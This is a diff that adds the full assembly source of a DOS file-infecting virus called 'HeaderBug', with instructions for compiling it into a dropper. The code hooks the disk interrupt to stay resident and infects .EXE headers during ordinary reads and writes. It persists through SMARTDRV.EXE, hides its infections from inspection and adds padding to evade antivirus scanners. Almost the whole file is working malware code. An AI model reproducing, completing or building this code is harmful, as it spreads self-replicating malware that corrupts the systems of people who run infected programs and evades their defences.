@@ -1,0 +1,288 @@
+;=============================================================================
+;       Virus Name:  HeaderBug
+; Effective Length:  324 Bytes (no increase in file length)
+;
+;            Notes:  
+;                  - resident, BIOS-level-stealth .EXE header infector
+;                  - undetectable by any current A-V scanner even w/o stealth
+;                  - infects SMARTDRV.EXE to ensure residency at each boot
+;                  - infects .EXE header sectors whenever accessed for write
+;                    OR read (during reads only if A-V monitor is not
+;                    resident)
+;                  - As a result, will infect every target .EXE file during
+;                    even such operations as a fixed disk DEFRAG
+;                  - successfully infects Windows .EXE files without
+;                    detection even when 32-bit file access is in use
+;                  - does not decrease available memory
+;                  - no harmful payload
+;
+;       To Compile:
+;                  - use shareware A86 assembler
+;                  - type "a86 headbug.a86"
+;                  - resulting headbug.com is actually an .exe file.
+;                    It is a virus dropper which, if executed, will infect
+;                    your system with HeaderBug
+;=============================================================================
+
+start_offset            equ     07d*4-1
+res_offset              equ     start_offset-01a0
+com_offset              equ     0100
+header_offset           equ     01a0
+infect_tag              equ     0c033
+setver_tag              equ     0d4a
+viruslength             equ     0144
+old_code_length         equ     012
+
+EH_Signature    dw      'ZM'            ;set to 'MZ' or 'ZM' for .exe files
+EH_Modulo       dw      0000            ;remainder of file size/512
+EH_Size         dw      0012            ;file size/512
+EH_Reloc        dw      0000     ;6     ;number of relocation items
+EH_Size_Header  dw      000a     ;8     ;size of header in paragraphs
+EH_Min_Mem      dw      0240            ;minimum paragraphs needed by file
+EH_Max_Mem      dw      0240            ;maximum paragraphs needed by file
+EH_SS           dw      0240            ;stack segment displacement
+EH_SP           dw      ?               ;stack pointer
+EH_Checksum     dw      ?               ;checksum, not used
+EH_IP           dw      0000     ;14    ;instruction Pointer of Exe file
+EH_CS           dw      0000     ;16    ;code segment displacement of .exe
+EH_1st_reloc    dw      ?               ;first relocation item
+EH_ovl          dw      ?               ;overlay number
+
+                db      084 dup ?       ;pad rest of header w/dummy bytes
+
+;-----------------------------------------------------------------------------
+; Header_entry - Tests interrupt vector table for room and if there is room,
+; installs virus in unused area of interrupt table.  Read and write disk
+; cache on all drives are disabled (prevents infection problems), SMARTDRV
+; infected in default directory to ensure that virus becomes resident on each
+; boot and that SMARTDRV's disk cache is never installed.  SMARTDRV is
+; infected through read-file action (not write) by installed int13 routine.
+;-----------------------------------------------------------------------------
+
+header_entry:
+        xor     ax,ax                   ;set ax=0
+        mov     ds,ax                   ;set ds=ax
+        mov     es,ax                   ;set es=ax
+
+        dec     ax                      ;set ax=ffffh as flag for zero_test
+        mov     si,start_offset         ;set si to start address in INT table
+        push    si                      ;save value for later use
+        call    zero_test               ;check for clear area in INT table
+        pop     di                      ;set destination offset to INT table
+        jc      exit_header             ;if area not clear, exit, don't install
+
+        xor     si,si                   ;set source offset to virus start
+        call    move_it                 ;move virus to empty space in INT table
+
+        mov     di,offset old13+res_offset      ;set destination for int13
+        mov     si,013*04                       ;set source for int13 vector
+        push    si                      ;save value for later use
+        movsw                           ;copy int13 vector
+        movsw                           
+        pop     di                              ;set destination for new value
+        mov     ax,offset int13+res_offset      ;virus int13 routine offset
+        stosw                                   ;store new offset in int13
+        xor     ax,ax                           ;virus int13 routine segment
+        stosw                                   ;steal int13
+
+        mov     bx,03                   ;value required for STATUS call
+        mov     bp,05                   ;set max. number of drives
+kill_cache:
+        mov     ax,04a10                ;SMARTDRV STATUS function
+        push    ax                      ;save it for later use
+        mov     dl,02                   ;turn off drive's read buffer
+        int     02f                     ;do it
+
+        pop     ax                      ;restore ax
+        mov     dl,04                   ;turn off drive's write buffer
+        int     02f                     ;do it
+
+        dec     bp                      ;decrement drive number
+        jns     kill_cache              ;if drive number >=0, repeat process
+
+        push    cs
+        pop     ds                      ;set ds=cs
+
+        mov     ax,03d00                         ;open file w/handle
+        mov     dx,offset filename-header_offset ;point to filename
+        int     021                              ;do it
+        jc      exit_header             ;if flag=fail, exit
+
+        mov     bx,ax                   ;save handle
+
+        mov     ah,03f                  ;read file w/handle
+        mov     ch,02                   ;read 200h bytes (header sector)
+        mov     dh,02                   ;point to buffer area beyond virus
+        int     021                     ;do it (infect SMARTDRV.EXE header)
+
+        mov     ah,03e                  ;close file w/handle
+        int     021                     ;do it
+
+exit_header:
+        mov     ah,04c                  ;terminate with return code
+        int     021                     ;do it
+
+filename:       db      'C:\DOS\SMARTDRV.EXE',0 ;file to initially infect
+
+;-----------------------------------------------------------------------------
+; Int13 - On any read or write, checks sector for .EXE header characteristic.
+; Checks for word found in header of SETVER.EXE to prevent infection and
+; resulting problems (lockup) when an infected SETVER is loaded from default
+; CONFIG.SYS.  If sector is being read, checks for infection then checks for
+; presence of A-V monitor before infecting.  If sector is being written, only
+; checks for SETVER header, since stealth on prior int13 would hide previous
+; infection and since any A-V monitor would expect a write action.  In both
+; read or write cases, sector is restored to appear identical to pre-infection
+; before buffer containing .EXE header is presented to calling program.  Name
+; of virus stored in area of interrupt table used by TBDriver vectors in
+; order to prevent system crash if TBDriver is loaded after virus is resident.
+;-----------------------------------------------------------------------------
+
+int13:
+        push    cx                      ;preserve registers
+        push    si
+        push    di
+        push    ds
+
+        push    es
+        pop     ds                      ;set ds=es
+
+        cmp     ah,03                   ;write operation?
+        je      write                   ;if so, jump to write routine
+        cmp     ah,02                   ;read operation?
+        jne     chain_old_int13         ;if not, exit
+
+read:
+        pushf
+        call    far cs:[offset old13+res_offset] ;call int13 (read sector)
+        jc      exit_int13                       ;if flag=fail, exit
+
+        mov     si,'ZM'                 ;bytes indicating .EXE header
+        cmp     [bx],si                 ;.EXE header?
+        jne     exit_fail               ;if not, exit
+
+        cmp     [bx+014],setver_tag     ;is this SETVER's header?
+        je      exit_fail               ;if so, exit
+
+        cmp     [bx+0a0],infect_tag     ;already infected?
+        je      disinfect               ;if so, jump to stealth routine
+
+        push    ds                      ;preserve ds
+        xor     di,di                   ;set di to virus destination
+        mov     ds,di                   ;set ds to point to INT vector table
+        cmp     byte ptr [040*4+3],0f0  ;int40 still pointing at ROM?
+        pop     ds                      ;restore ds
+        jb      exit_fail               ;if not pointing at ROM, A-V monitor
+                                        ; present, so exit
+        push    cx                      ;preserve cx
+        call    infect                  ;infect header in buffer
+        pop     cx                      ;restore cx
+        jc      exit_fail               ;if flag=fail, exit
+
+        mov     ax,0301                 ;write infected header buffer
+        pushf
+        call    far cs:[offset old13+res_offset] ;do it (call original int13)
+
+disinfect:
+        lea     si,[bx+offset old_header-com_offset]    ;set source for code
+        lea     di,[bx+06]                              ;set destination
+        mov     cx,old_code_length      ;set length of old code to restore
+        cld                             ;move direction=forward
+        rep     movsb                   ;restore original code to header
+
+        xor     al,al                           ;set al=0
+        mov     cx,viruslength+old_code_length  ;set # bytes to overwrite
+        lea     di,[bx+0a0]                     ;set destination for writes
+        rep     stosb                   ;overwrite viral code with zeros
+
+exit_fail:
+        clc                             ;clear carry to hide any I/O errors
+
+exit_int13:
+        pop     ds                      ;restore registers
+        pop     di
+        pop     si
+        pop     cx
+
+        retf    02                      ;return to calling program
+
+tbdriver_vector_area:
+        db      '=HeaderBug='           ;space filler for TBDriver vector
+
+write:
+        mov     si,'ZM'                 ;bytes indicating .EXE header
+        cmp     [bx],si                 ;.EXE header?
+        jne     chain_old_int13         ;if not, exit
+
+        cmp     [bx+014],setver_tag     ;is this SETVER's header?
+        je      chain_old_int13         ;if so, exit
+
+        push    ax                      ;preserve ax
+        call    infect                  ;infect header in buffer
+        pop     ax                      ;restore ax
+
+chain_old_int13:
+        pop     ds                      ;restore registers
+        pop     di
+        pop     si
+        pop     cx
+
+        db      0ea                     ;"jump far"
+old13:
+        dw      02 dup ?                ; to address of orig. int13 routine
+
+infect:
+        lea     si,[bx+0a0]             ;set si=source offset for virus code
+zero_test:
+        mov     cx,viruslength+old_code_length ;set scan count to virus length
+        cld                                    ;set direction of scan=forward
+test_byte:
+        lodsb                           ;load a byte from area to be scanned
+        or      al,al                   ;check for zero
+        loopz   test_byte               ;if zero, check next byte
+        or      cx,cx                   ;counted down to zero w/o prior exit?
+        jz      infect_OK               ;if so, area is clear to infect
+        stc                             ;set "clear-to-infect" flag
+        ret                             ;return to calling routine
+
+infect_OK:
+        inc     ah                      ;increment ah
+        jz      exit_infect             ;true if calling routine=header_entry
+        mov     cl,old_code_length      ;length of old header code to preserve
+        lea     si,[bx+06]                           ;set source for old code
+        lea     di,[bx+offset old_header-com_offset] ;set storage destination
+        rep     movsb                                ;store old code in virus
+
+        xor     ax,ax                   ;set ax=0
+        lea     di,[bx+014]             ;set destination to cs:ip location
+        stosw                           ;set cs:ip values in header to 0:0
+        stosw                           ; by storing zeros in their locations
+        lea     di,[bx+06]              ;set destination to # of reloc. items
+        stosw                           ;set # of relocation items to zero
+        mov     al,0a                   ;set header size value to 0ah to
+        stosw                           ; place entry point at start of virus
+
+        mov     si,start_offset         ;set si=start offset of virus
+        lea     di,[bx+0a0]             ;set di=destination offset in buffer
+
+move_it:
+        push    ds                      ;preserve ds
+        push    cs
+        pop     ds                      ;set ds=cs
+
+        mov     cx,viruslength          ;set cx move count to length of virus
+        cld                             ;set direction of move to forward
+        rep     movsb                   ;move virus to header in buffer
+
+        pop     ds                      ;restore ds
+
+exit_infect:
+        clc                             ;clear flag to hide any I/O errors
+        ret                             ;return to calling routine
+
+old_header:
+        db      old_code_length dup ?   ;storage area for original header
+                                        ; contents
+dummy_bytes:
+        db      0220a dup ?             ;dummy bytes used to increase dropper
+                                        ; length to avoid detection by f-prot
